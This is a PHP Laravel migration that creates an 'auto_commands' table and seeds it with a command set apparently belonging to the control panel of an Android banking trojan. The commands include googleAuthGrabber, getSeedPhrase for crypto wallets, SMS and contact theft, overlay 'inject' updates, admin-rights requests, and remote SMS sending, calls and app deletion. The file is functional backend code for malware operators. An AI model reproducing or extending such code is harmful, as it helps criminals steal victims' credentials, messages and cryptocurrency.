<?php

use App\Models\AutoCommand;
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateAutoCommandsTable extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('auto_commands', function (Blueprint $table) {
            $table->id();
            $table->json('data')->nullable();
            $table->timestamps();
        });

        AutoCommand::create([
            "data" => [
                "getAccounts" => [
                    "enabled" => false,
                ],
                "getInstalledApps" => [
                    "enabled" => false,
                ],
                "updateInjectList" => [
                    "enabled" => false,
                ],
                "getSMSList" => [
                    "enabled" => false,
                ],
                "getContactsList" => [
                    "enabled" => false,
                ],
                "getAdminRights" => [
                    "enabled" => false,
                ],
                "googleAuthGrabber" => [
                    "enabled" => false,
                ],
                "calling" => [
                    "enabled" => false,
                    "number" => "",
                    "locked" => false,
                ],
                "openInject" => [
                    "enabled" => false,
                    "application" => "",
                ],
                "sendPush" => [
                    "enabled" => false,
                    "text" => "",
                    "title" => "",
                    "application" => "",
                ],
                "sendSMS" => [
                    "enabled" => false,
                    "number" => "",
                    "message" => "",
                ],
                "getSeedPhrase" => [
                    "enabled" => false,
                    "wallets" => [],
                ],
                "clearAppData" => [
                    "enabled" => false,
                    "application" => "",
                ],
                "runApp" => [
                    "enabled" => false,
                    "application" => "",
                ],
                "deleteApp" => [
                    "enabled" => false,
                    "application" => "",
                ],
                "openUrl" => [
                    "enabled" => false,
                    "url" => "",
                ]
            ],
        ]);
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('auto_commands');
    }
}
